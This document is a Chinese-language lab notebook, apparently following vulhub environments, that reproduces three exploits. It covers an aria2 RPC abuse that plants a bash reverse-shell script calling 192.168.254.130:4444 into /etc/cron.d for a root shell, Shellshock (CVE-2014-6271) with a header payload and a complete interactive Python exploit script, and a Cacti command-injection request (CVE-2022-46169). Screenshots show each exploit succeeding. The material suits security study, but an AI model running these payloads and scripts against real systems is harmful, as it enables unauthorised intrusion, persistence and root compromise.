<!-- 这是一张图片，ocr 内容为：X SEND CANCEL RESPONSE REQUEST PRETTY PRETTY RENDER RAW ACTIONS ACTIONS RAW 1 HTTP/1.1 404 NOT FOUND 1 GET / HTTP/1.1 2HOST:192.168.254.135:6800 23 DATE:MON, 24 JUN  2024 06:55:23 GMT USER-AGENT:MOZILLA/5.0 (X11;LINUX X86 64:RV:109.0) CONTENT-LENGTH: 1456789 GECKO/20100101 FIREFOX/115.0 EXPIRES:MON, 24 JUN  2024 06:55:23 GMT ACCEPT: CACHE-CONTROL:NO-CACHE TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9 ACCESS-CONTROL-ALLOW-ORIQIN: * ,IMAGE/AVIF,IMAGE/WEBP,*/*;Q.8 CONNECTION: CLOSE 56789 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING: GZIP, DEFLATE CONNECTION: CLOSE UPGRADE-INSECUREQUESTS: -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844814-ddb13f59-da04-4d9b-aede-90a75bb8264c.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">因为</font><font style="color:#1f2328;background-color:#FFFFFF;">rpc</font><font style="color:#1f2328;background-color:#FFFFFF;">通信需要使用</font><font style="color:#1f2328;background-color:#FFFFFF;">json</font><font style="color:#1f2328;background-color:#FFFFFF;">或者</font><font style="color:#1f2328;background-color:#FFFFFF;">xml</font><font style="color:#1f2328;background-color:#FFFFFF;">，不太方便，所以我们可以借助第三方</font><font style="color:#1f2328;background-color:#FFFFFF;">UI</font><font style="color:#1f2328;background-color:#FFFFFF;">来和目标通信，如 </font>[http://binux.github.io/yaaw/demo/](http://binux.github.io/yaaw/demo/#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<font style="color:#333333;">在这之前，先写好反弹</font><font style="color:#333333;">shell</font><font style="color:#333333;">并用</font><font style="color:#333333;">python</font><font style="color:#333333;">搭建</font><font style="color:#333333;">web</font><font style="color:#333333;">服务</font>

<!-- 这是一张图片，ocr 内容为：(KALI@KALI) /DOWNLOADS PLACES -M HTTP.SERVER 888 PYTHON3 SERVING HTTP ON 0.0.0.0 PORT 8888(HTTP://0.0.0.0.0.0:888/) MAINTAINERS OF BURP.B_Q KAL WARNINGS OF FURTHER ILLEGAL REFL -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844824-fb2d1a7d-ba98-4c3a-8d8a-9082071832c1.png)

<font style="color:#333333;">shell文件，末尾需要一个换行符：</font>

```plain
#!/bin/bash 
/bin/bash -i >& /dev/tcp/192.168.254.130/4444 0>&1
```

<!-- 这是一张图片，ocr 内容为：~/DOWNLOADS/SHELL.SH - MOUSEPAD DOCUMENT HELP FILE EDIT SEARCH VIEW QAN SCX石口 BLLEC X 1 #!/BIN/BASH 2/BIN/BASH -I > G /DEV/TCP/192.168.254.130/444 0>81 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844787-da9f11b5-83c7-44a1-85c7-a927d4d7ea83.png)

<font style="color:#1f2328;background-color:#FFFFFF;">打开yaaw，点击配置按钮，填入运行aria2的目标域名：</font><font style="color:#1f2328;">http://your-ip:6800/jsonrpc</font><font style="color:#1f2328;background-color:#FFFFFF;">:</font>

<!-- 这是一张图片，ocr 内容为：BINUX.GITHUB.IO/YAAW/DEMO/ KALI TRAINING KALI DOCS MSFU EXPLOIT-DB OFFENSIVE SECURITY NETHUNTER KALI TOOLS KALI LINUX KALI FORUMS OTH YET ANOTHER ARIA2 WEB FRONTEND ARIA2 18.8 0KB/S/0KB/S REFRESH ADD SETTINGS ACTIVE TASKS HTTP://192.168.254.135:6800/JSONRPC JSON-RPC PATH O10S 5S OFF 1S AUTO REFRESH O 1MIN FINISH NOTIFICATION O DISABLE ENABLE OTHER TASKS UPLOAD LIMIT DOWNLOAD LIMIT 5 20 MB MIN SPLIT SIZE CONCURRENT DOWNS USER AGENT ARIA2/18.8 BASE DIR /USR/ARIA2/DATA SAVE CANCEL COPYRIGHT BINUX -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807844877-c08b5e0c-fdac-483f-9727-769775b487ce.png)

<font style="color:#1f2328;background-color:#FFFFFF;">然后点击</font><font style="color:#1f2328;background-color:#FFFFFF;">Add</font><font style="color:#1f2328;background-color:#FFFFFF;">，增加一个新的下载任务。在</font><font style="color:#1f2328;background-color:#FFFFFF;">Dir</font><font style="color:#1f2328;background-color:#FFFFFF;">的位置填写下载至的目录，</font><font style="color:#1f2328;background-color:#FFFFFF;">File Name</font><font style="color:#1f2328;background-color:#FFFFFF;">处填写文件名。比如，我们通过写入一个</font><font style="color:#1f2328;background-color:#FFFFFF;">crond</font><font style="color:#1f2328;background-color:#FFFFFF;">任务来反弹</font><font style="color:#1f2328;background-color:#FFFFFF;">shell</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：ADD TASK UPLOAD TORRENT HTTP://192.168.254.130:888/SHELL FILE NAME SHELL DIR LETC/CRON.D PARAMETERIZED PAUSE WHEN URI ADDED 5 CONN/SERV SPLIT 0 0 SEED TIME SEED RATIO HEADER CANCEL ADD -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845550-a7654050-3d81-46b9-b6f0-1fe907c2fd9c.png)

<font style="color:#1f2328;background-color:#FFFFFF;">这时候，</font><font style="color:#1f2328;background-color:#FFFFFF;">arai2</font><font style="color:#1f2328;background-color:#FFFFFF;">会将恶意文件（我指定的</font><font style="color:#1f2328;background-color:#FFFFFF;">URL</font><font style="color:#1f2328;background-color:#FFFFFF;">）下载到</font><font style="color:#1f2328;background-color:#FFFFFF;">/etc/cron.d/</font><font style="color:#1f2328;background-color:#FFFFFF;">目录下，文件名为</font><font style="color:#1f2328;background-color:#FFFFFF;">shell</font><font style="color:#1f2328;background-color:#FFFFFF;">。而在</font><font style="color:#1f2328;background-color:#FFFFFF;">debian</font><font style="color:#1f2328;background-color:#FFFFFF;">中，</font><font style="color:#1f2328;background-color:#FFFFFF;">/etc/cron.d</font><font style="color:#1f2328;background-color:#FFFFFF;">目录下的所有文件将被作为计划任务配置文件（类似</font><font style="color:#1f2328;background-color:#FFFFFF;">crontab</font><font style="color:#1f2328;background-color:#FFFFFF;">）读取，等待一分钟不到即成功反弹</font><font style="color:#1f2328;background-color:#FFFFFF;">shell</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：YET ANOTHER ARIA2 WEB FRONTEND ARIA2 1.18.8 #0KB/S/0KB/S ADD 6 REFRESH ACTIVE TASKS NO ACTIVE TASKS OTHER TASKS 63.00B SHELL 100.00% -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845635-469906b9-2377-45e3-b8d7-6482c2c38718.png)

<font style="color:#333333;">可以看到上传成功了。</font>

<!-- 这是一张图片，ocr 内容为： DOCKER EXEC -IT 2A78F96A2F5 BASH [CENTOS@LOCALHOST RCE]$ S $SUDO ROOT@2A78F96A2F55://# CD /ETC/CORN.D/ ROOT@2A78F96A2F55://ETC/CORN.D# LS SHELL ROOT@2A78F96A2F55://ETC/CORN.D# CAT SHELL #!/BIN/BASH /BIN/BASH -I >5 /DEV/TGP/192:168:254  130/444 0>61R00TA2A78F9632F55;/ETC/COTN .D# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807845939-524e72ef-a875-40e8-9284-21ce43dc135f.png)

<!-- 这是一张图片，ocr 内容为：(KALISKALI)-[~/DESKTOP/VULHUB-MASTER/ARIA2/RCE] S NC -L -P 444 /BIN/SH: O: CAN'T ACCESS TTY; JOB CONTROL TURNED O D OFF JOB CONTROL TTYI # ID UID-0(ROOT) GID-0(ROOT) GROUPS-0(ROOT) # WHOAMI ROOT QID-ROOT) ROOT GROUPS-0(ROOT) # UNAME -A 64 #1 SMP MON OCT 19 16:18:59 UTC 2020 LINUX 06AC02A29075 3.10.0-1160.EL7.X86_64 #1 X86_64 GNU/LINUX # PS AUX TIME COMMAND VSZ PID %CPU %MEM RSS TTY STAT START USER 0 /BIN/SH -C 0.0 4328 100 14:52 0:00 656 SS ROOT 9B 96 CRON -CONF-PATHUSR/ARIA2/ARIA2.CONF SET-EX AR1A2C 80.0.0 14:52 SS 0.0 0:00 CRON 25896 1064? ROOT 9468 ? 90.0 S 0.5 54572 ARIA2C--CO 00:0 14:52 ROOT NF-PATH-/USR/ARIA2/ARIA2.CONF 0.1   20236 0:00 BASH 7900 2032 PTS/0 15:17 +SS ROOT 0.0 84 0.0 40632 15:18 CRON 00:0 1300? S ROOT 1846028 SS 0:00 /BIN/SH -C 656 ? 0.04328 15:18 0.0 85 ROOT /USR/BIN/PERL -E 'USE SOCKET;$I;"192.168.254.130";$P;4444;SOCKET(S,PF INET,SO CK-STREAM,GETPROTOBYNANE("TEP");IF(CONNECT(S,SOCKADDR-IN($P,INET-ATON($I))))) FOPEN(STDIN,">85");OPEN(STDOUT,">6S");OPEN(STDERR,">6S);EXEC("/BIN/SH -I"); /BIN/SH -I 656? 4328 15:18 0.0 S 86 0:00 0.0 ROOT 17492 1136 ? 0.0 15:21 R 0:00 PS AUX 0.0 100 ROOT 202202211908075. 202202211904167. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807846112-d5944297-10f7-473b-9ee5-d7049ce94731.png)

<font style="color:#636c76;background-color:#FFFFFF;">如果反弹不成功，注意</font><font style="color:#636c76;background-color:#FFFFFF;">crontab</font><font style="color:#636c76;background-color:#FFFFFF;">文件的格式，以及换行符必须是</font><font style="color:#636c76;">\n</font><font style="color:#636c76;background-color:#FFFFFF;">，且文件结尾需要有一个换行符。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">当然，我们也可以尝试写入其他文件，更多利用方法可以参考</font>[这篇文章](https://paper.seebug.org/120/#tdsub)

# <font style="color:#1f2328;background-color:#FFFFFF;">Bash Shellshock </font><font style="color:#1f2328;background-color:#FFFFFF;">破壳漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2014-6271</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1a1a1a;">编译运行：</font>
<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，有两个页面</font><font style="color:#1f2328;">http://your-ip:8080/victim.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">和</font><font style="color:#1f2328;">http://your-ip:8080/safe.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">。其中</font><font style="color:#1f2328;background-color:#FFFFFF;">safe.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">是最新版</font><font style="color:#1f2328;background-color:#FFFFFF;">bash</font><font style="color:#1f2328;background-color:#FFFFFF;">生成的页面，</font><font style="color:#1f2328;background-color:#FFFFFF;">victim.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">是</font><font style="color:#1f2328;background-color:#FFFFFF;">bash4.3</font><font style="color:#1f2328;background-color:#FFFFFF;">生成的页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/VICTIM.CGI KALI LINUX KALI TRAINING KALI FORUMS KALI DOCS KALI TOOLS HELLO WORLD -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807917947-e720a400-5a87-4492-bad2-1144b1516c81.png)<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/SAFE.CGI KALI FORUMS KALI LINUX KALI TOOLS KALI TRAINING KALI DOCS HELLO WORLD -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807917951-442bcb93-6ea3-4d27-a183-3819bfa5dedc.png)

<font style="color:#1f2328;background-color:#FFFFFF;">将</font><font style="color:#1f2328;background-color:#FFFFFF;">payload</font><font style="color:#1f2328;background-color:#FFFFFF;">附在</font><font style="color:#1f2328;background-color:#FFFFFF;">User-Agent</font><font style="color:#1f2328;background-color:#FFFFFF;">中访问</font><font style="color:#1f2328;background-color:#FFFFFF;">victim.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```

<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://19 CANCEL SEND RESPONSE REQUEST PRETTY PRETTY ACTIONS ACTIONS RAW RAW RENDER GET /VICTIM.CGI HTTP/1.1 1  HTTP/1.1  200 OK 2 DATE:WED, 26 JUN  2024 07:56:53 GMT HOST:192.168.254.135:8080 3SERVER:APACHE/2.4.10(DEBIAN) USER-AGENT:(){ FOO:];ECHO CONTENTENT-TYPE:TEXT/PLAIN:ECHO;/USR/BIN/ID 4ACCEPT: CONTENT-LENGTH:54 TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,IMAGE/AVIF,IMAGE/WEBP CONNECTION:CLOSE CONTENT-TYPE: TEXT/PLAIN */*;Q-0.8 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE UID-33(WWW-DATA) GID-33(WWW-DATA) GROUPS-33(WWW-DATA) CONNECTION:CLOSE UPGRADE-INSECUREQUESTS:1 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807917983-f9526f08-80a4-4e69-a949-5d1cfe550c49.png)

<font style="color:#1f2328;background-color:#FFFFFF;">同样的数据包访问</font><font style="color:#1f2328;background-color:#FFFFFF;">safe.cgi</font><font style="color:#1f2328;background-color:#FFFFFF;">，不受影响：</font>

<!-- 这是一张图片，ocr 内容为：TARGET:HTTP://192.168.254.135:8080 CANCEL SEND REQUEST RESPONSE PRETTY ACTIONS ACTIONS RAW RAW RENDER PRETTY GET /SAFE.CGI HTTP/1.1 HTTP/1.1  200  OK 23 2DATE:WED,26 JUN 2024 07:59:55 GMT HOST:192.168.254.135:8080 USER-AQENT:() () I ECHO CONTENTENT-TYPE:TEXT/PLAIN; ECHO;/USR/BIN/ID SERVER:APACHE/2.4.10(DEBIAN) 4 VARY:ACCEPT-ENCODING ACCEPT: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XML;Q-0.9,IMAGE/AVIF,IMAGE/WE 5 CONTENT-LENGTH:165 6C CONNECTION:CLOSE BP,*/*:G-0.8 70 S CONTENT-TYPE:TEXT/HTML ACCEPT-LANQUAQE:EN-US,EN;Q0.5 6789 89 ACCEPT-ENCODING:QZIP,DEFLATE <HTML> CONNECTION:CLOSE THT SHEAD> UPGRADE-INSECUREQUESTS:1 <META HTTP-EQUIV-"CONTENT-TYPE" CONTENT-"TEXT/HTML; CHARSET-UTF-8"> 10 <TITLE> BASH SHELLSHOCK </TITLE> 13 </HEAD> 14 `BODY> 15 <P> HELLO WORLD 16 17 AAAY 18 /BODY> 19 /HTML -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807917992-3ad3f174-b591-473a-8091-80b3114103e2.png)

## <font style="color:#1a1a1a;">漏洞EXP</font>
```plain
#!/usr/bin/python

# Successful Output:
# # python shell_shocker.py <VulnURL>
# [+] Attempting Shell_Shock - Make sure to type full path
# ~$ /bin/ls /
# bin
# boot
# dev
# etc
# ..
# ~$ /bin/cat /etc/passwd

from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import input
import sys, urllib.request, urllib.error, urllib.parse

if len(sys.argv) != 2:
print("Usage: shell_shocker <URL>")
sys.exit(0)

URL=sys.argv[1]
print("[+] Attempting Shell_Shock - Make sure to type full path")

while True:
command=input("~$ ")
opener=urllib.request.build_opener()
opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
try:
response=opener.open(URL)
for line in response.readlines():
print(line.strip())
       except Exception as e: print(e)
```

<!-- 这是一张图片，ocr 内容为：(KATISKALI)-[~/DESKTOP/VULHUB-MASTER/BASH/CVE-2014-6271] HTTP://192.168.254.135:8080/VICTIM.CGI PYTHON3 SHELT SHOCKER.PY H  MAKE SURE TO TYPE FULL PATH ATTEMPTING SHELL_SHOCK ID-REPRODUCE/SHEL *$ /BIN/LS 443'[34.107.243. B'INDEX.HTML ACTI B'SAFE.CGI PREVIEW BLAME 75 LINES (52 LO CODE B'VICTIM.CGI' ~$ /BIN/LS  B'BIN # ~$ /BIN/CAT /ETC/PASSWD B'BOOT B'DEV NUX  X86 64; RV:10 . IMPORT PRINT_FUR FUTURE FROM B'ETC FROM FUTURE IMPORT STANDARD_LIB B'HOME B'LIB STANDARD_LIBRARY.INSTALL ALIASES B'LIB64 FROM BUILTINS IMPORT INPUT B'MEDIA' IMPORT SYS,URLLIB.REQUEST,URLI BMNT TIFICATION B'OPT F9TMAC2A三 BPROC IF LEN(SYS.ARGV)! 2: B'ROOT PRINT("USAGE:SHELL_SHOO B'RUN SYS.EXIT(0) B'SBIN URLSYSARGV[1] B'TMP PRINT("[+] ATTEMPTING SHELL_SHOD -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807918024-292f385a-42a9-486a-9a91-c2d020483a17.png)<!-- 这是一张图片，ocr 内容为：/ETC/PASSWD /BIN/CAT ALL TRAINING B'ROOT:X:0:0:ROOT://ROOT:/BIN/BASH' B'DAEMON:X:1:DAEMON://USR/SBIN://USR/SBIN/NOLOGIN B'BIN:X:2:BIN://BIN://USR/SBIN/NOLOGIN B'SYS:X:3:3:SYS://DEV:/USR/SBIN/NOLOGIN B'SVNC:X:4:65534:SYNC://BIN:/BIN/SYNC' B'GAMES:X:5:60:GAMES://USR/GAMES://USR/SBIN/NOLOGIN B'MAN:X:6:12:MAN://VAR/CACHE/MAN://USR/SBIN/NOLOGIN' B'LP:X:7:7:LP://VAR/SPOOL/LPD://USR/SBIN/NOLOGIN B'MAIL:X:8:8:MAIL:/VAR/MAIL:/USR/SBIN/NOLOGIN' B'NEWS:X:9:9:NEWS://VAR/SPOOL/NEWS://USR/SBIN/NOLOGIN' B'UUCP:X:10:10:UUCP://VAR/SPOOL/UUCP://USR/SBIN/NOLOGIN' B'PROXY:X:13:13:PROXY:/BIN://USR/SBIN/NOLOGIN' B'WWW-DATA:X:33:33:WWW-DATA:/VAR/WWW://USR/SBIN/NOLOGIN' B'BACKUP:X:34:34:BACKUP://VAR/BACKUPS://USR/SBIN/NOLOGIN' B'LIST:X:38:38:MAILING LIST MANAGER://VAR/LIST://USR/SBIN B'IRC:X:39:39:IRCD://VAR/RUN/IRCD://USR/SBIN/NOLOGIN (ADMIN)://VAR B'GNATS:X:41:41:GNATS BUG-REPORTING SYSTEM (ADM OLOGIN B'NOBODY:X:65534:65534:NOBODY:/NONEXISTENT://USR/SBIN/NO B'SYSTEMD-TIMESYNC:X:100:103:SYSTEMD TIME SYNCHRONIZATI N/FALSE B'SYSTEMD-NETWORK:X:101:104:SYSTEMD NETWORK MANAGEMENT, -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780807918839-d6960d10-0f4e-4ff3-b9c4-6390274dc911.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Cacti </font><font style="color:#1f2328;background-color:#FFFFFF;">前台命令注入漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2022-46169</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">Cacti 1.2.22</font><font style="color:#1f2328;background-color:#FFFFFF;">版本服务器：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">环境启动后，访问</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">会跳转到登录页面。使用</font><font style="color:#1f2328;background-color:#FFFFFF;">admin/admin</font><font style="color:#1f2328;background-color:#FFFFFF;">作为账号密码登录，并根据页面中的提示进行初始化。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/INSTALL/INSTALL.PHP OFFENSIVE SECURITY NETHUNTER KALI DOCS MSFU KALI TOOLS KALI FORUMS USER LOGIN ENTER YOUR USERNAME AND PASSWORD BELOW USERNAME ADMIN PASSWORD KEEP ME SIGNED IN LOGIN VERSION NEW INSTALL | (C) 2004-2024 - THE CACTI GROUP -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821118874-d93dd44f-a5f9-483a-9c3f-68c2205a85f6.png)

<!-- 这是一张图片，ocr 内容为：CACTI SERVER V1.2.22 - INSTALLATION WIZARD CACTI VERSION 1.22-LICENSE AGREEMENT PIECES OF DATA THAT CACTI NEEDS TO KNOW. OPERATING SYSTEMS. LCACT IS ICENSED UNDER THE GNU GENERAL PUBLICENSE,YOU GENSE,YOU MUST AGREE TOVISIONS BEFORE CONTINUIN  THLS PRJAN 1S TTEE SOTTY IT UND  EAN FEDISTR ET AND  AND IT AND IT UNDER THE TERUS OF THE  RUDIT  LI ITHAS PROORAN 1T DISERIDUTED IN THE ROPE THAT IT WALL  NALL DE USERUT HTTHOUT ANY WAERANTY: NVEN THE, INARTABTY OF HERCHANTABILITY OR FETTHESS FOR A PARTICULAR PURPOSE, SER THE GRUY GRUBLECENSE FOR MOR D ACCEPT GPL LICENSE AGREEMENT ENGLISH SELECT DEFAULT THEME :MODERN PREVIOUS BEGIN -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821119002-9c036a87-561f-47a8-bdc0-3a753901de3b.png)

<font style="color:#1f2328;background-color:#FFFFFF;">实际上初始化的过程就是不断点击</font><font style="color:#1f2328;background-color:#FFFFFF;">“</font><font style="color:#1f2328;background-color:#FFFFFF;">下一步</font><font style="color:#1f2328;background-color:#FFFFFF;">”</font><font style="color:#1f2328;background-color:#FFFFFF;">，直到安装成功：</font>

<!-- 这是一张图片，ocr 内容为：TI服务器V1.22-安装向导 CACTI服 完成 YOUR CACTI SERVER V1.22 HAS BEEN INSTALLED/UPDATED.YOU MAY NOW NOW START USING THE SOFTWARE. PROCESS LOG 2024-06-26 08:20:09 -INSTALL:ALWAYS:安 安装在2024-06-2608:19:40开始,在2024-06-2608:20:09完成 :2024-06-26 08:20:09 - INSTALL: ALWAYS: FINISHED INSTALL PROCESS FOR V1.22 2024-06-26 08:20:09 - INSTALL: ALWAYS: GENERATING RSA KEY PAIR : 2024-06-26 08:20:09 - INSTALL: ALWAYS: REPOPULATING SNMP AGENT CACHE 2024-06-26 08:20:09 - INSTALL: ALWAYS: REPOPULATING POLLER CACHE :2024-06-26 08:20:09 - INSTALL: ALWAYS: ADDING DEVICE TO DEFAULT TREE : 2024-06-26 08:20:09 - INSTALL: ALWAYS: CREATING GRAPHS FOR DEFAULT DEVICE 2924-06-26 08:20:98 -INSTALL: ALWAYS: DEVICE TEMPLATE FOR FIRST CACTI DEVICE IS 6 :2024-96-26 98:29:9E - INSTALL:      SUBNET "192.1.  "ON NETWORK(I), NODE "ON", "ON", SUBNET "192.1.8 192.168.1.0/24" ;2024-06-26 98;20:08 - INSTALL: ALMAYS: MAPPING AUTOMATION TEMPLATE TOR DEVICE TEMPLATE "CISCO ROUTER ;2024-05-26 08;38 - INSTALL: ALL: ALMAYS; MAPPING AUTOMATION TEMPLATE FOR DEVICE TEMPLATE "WINDONS DE 2021-66-26 08:20:98 - INSTALL: ALVAYS: MAPPING AUTOMATION TEMPLATE FOR DEVICE TEMPLATE'NET-SUMP DEVIC 2024-06-26 08:20:08 - INSTALL:ALWAVS: REPAIRING AUTOMATION RULES 2834-0S-25 08;Z3:QS - INSTALL;  ALUBYS; INPORE OF  PACKADE  4IG  'T' SUICE,ZNL. ANDER PROFILE 'T' SUE :2024-08-26 08:20:07 - INSTALL; AIWAYS: ABOUT TO IMPORT PACKAGE #10 'WINDOWS,DEVICE-XML.97' 2024-06-26 08:20:07 -INSTALL:ALWAYS:IMPOR VS: IMPORT OF PACKAGE #9'SYNOLOGY NAS.XML.GZ' UNDER PROFILE '1' SUCCEED 2024-96-26 08:20:04 - INSTALL: ALWAYS: ABOUT TO IMPORT'PACKAGE'#9 'SYNOLOGYLNAS.XML.GZ'. 12021-66-26 88:20:04 - INSTALL: ALMAYS::IMPORT OF PACKAGE #B (PING.ADVANCED' PING.XML.92' UNDER PROFI SUCCEEDED :2024-06-26 08:20:04 - INSTALL: ALWAYS: ABOUT TO IMPORT PACKAGE #8 'PING ADVANCED PING-XML.G?'. 2024-06-26 08:20:04-INSTALL:ALWAYS:IM : IMPORT OF PACKAGE #7'NETSNMP DEVICE.XML.GZ' UNDER PROFILE '1' SUCCEED 2024-96-26 08:20:02 - INSTALL: ALWAYS: ABOUT TO IMPORT PACKAGE #7 'NETSNMP-DEVICE.XML.GZ' SUCCEEDED ;2034-95-26 08;Z8:02 - INSTALL; ALNAYS; IMPORT OF PACKAGE TH 'LOCAL LINUX HACHINE-XNL UNDER PROFILE ' ;2024-08-26 08;28:02 - INSTALL: ALMAYS; ABOUT TO IMPORT PACKAGE #6 "LOCAL LINUX MACHINE.XNL.GZ' R PROFILE '1 SUCCEEDED ;2024-05-26 08;23:02 - INSTALL; ALMAYS; IMPORT OF PACKAGE #5 'GENERIC,SNMP-OEVICE,XML.9Z' UNDER ;2024-06-26 08;20:90 - INSTALL: ALMAYS: ABOUT TO IMPORT PACKAGE #5 'GENERIC,SUMP-PEVICE:XML-GZ' ;3323-38-25 93;23:0B - IN5TALL;   INAYS;  INPORT PACK3DE 'CITRLY NEESE3JER,YP.YPL.7? UNDER PROFILE ' :2024-06-26 08:19:55 - INSTALL: ALVAYS: ABOUT TO IMPORT PACKAGE #4 'CLTRIX NETSCALER_VPX:XML.92'' :2024-95-26 08:19:55 - INSTALL: ALWAYS: IMPORT OF PACKAGE #3 'CISCO-ROUTER XML.9?' UNDER PROFILE'1' SUCCEEDED :2024-06-26 08;19:54 -INSTALL; ALMAYS; ABOUT TO IMPORT PACKAGE #3 'CISCO-ROUTER,XML.97' ;3924-95-3B OB;JBIS4 - THSTALL; ALUAVS; INOORS OF PACKA9S 42."GACTE STATS XRI,G?' UNDER  SUEE ' SUEES 开始使用 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821119207-3182902d-09e8-4b65-b91f-d48860c10d58.png)

<font style="color:#1f2328;background-color:#FFFFFF;">这个漏洞的利用需要</font><font style="color:#1f2328;background-color:#FFFFFF;">Cacti</font><font style="color:#1f2328;background-color:#FFFFFF;">应用中至少存在一个类似是</font><font style="color:#1f2328;">POLLER_ACTION_SCRIPT_PHP</font><font style="color:#1f2328;background-color:#FFFFFF;">的采集器。所以，我们在</font><font style="color:#1f2328;background-color:#FFFFFF;">Cacti</font><font style="color:#1f2328;background-color:#FFFFFF;">后台首页创建一个新的</font><font style="color:#1f2328;background-color:#FFFFFF;">Graph</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080 KALI FORUMS KALI TRAING KALI TOOLS KALI LINUX KALI DOCS NETHUNTER 日志 图形 报告 控制台 控制台 您已登录CACTI.您可以从下列基本步骤开始. 儿主控台 创建 为网络创建设备 为新设备创建图形 管理 查者新创建的图形 数据采集 模板 自动化 预置 导入/导出 门 主系统配置 实用工具 永排障 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821119105-8386866c-b9b8-4d82-821c-8bbcb9a7ad68.png)

<font style="color:#1f2328;background-color:#FFFFFF;">选择的</font><font style="color:#1f2328;background-color:#FFFFFF;">Graph Type</font><font style="color:#1f2328;background-color:#FFFFFF;">是</font><font style="color:#1f2328;background-color:#FFFFFF;">“Device - Uptime”</font><font style="color:#1f2328;background-color:#FFFFFF;">，点击创建：</font>

<!-- 这是一张图片，ocr 内容为：报告 日志 控制台 图形 控制台 创建新图形 儿主控台 NEW GRAPHS FOR [LOCAL LINUX MACHINE ](LOCALHOST LOCAL LINUX MACHINE) 创建 所有 设备 图形类型 LOCALLINUX MACHINE GO 清除 保存 新图形 默认 搜索 行数: 请输入搜索词 新设备 管理 图形模板 数据采集 图形模板名称 模板 LINUX-MEMORY USAGE 自动化 UNIX-LOAD AVERAGE 预置 UNIX-LOGGED IN USERS UNIX-PROCESSES 导入/导出 创建筑 系统配置 11 (选择要创建的图形类型) CACU STATS-USER IYPES 实用工具 CISCO-CPUUSAGE 永排障 一共1个项目 DEVICE-POLLING TIME DEVICE-UPTIME MO HOST MIB-LOGGED IN USERS LEN /DE HOST MIB-PROCESSES NET-SNMP-COMBINED SCSI DISK BYTES NET-SNMP-COMBINED SCSI DISK I/O NET-SNMP-CONTEXT SWITCHES NET-SNMP-CPU UTILIZATION NET-SNMP-INTERRUPTS NET-SNMP-LOAD AVERAGE NET-SNMP-MEMORY USAGE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780821119186-a7d69864-7594-4454-baed-d74558dd3dc4.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞利用</font>
<font style="color:#1f2328;background-color:#FFFFFF;">完成上述初始化后，我们切换到攻击者的角色。作为攻击者，发送如下数据包：</font>

```plain
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success` HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost.lan
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

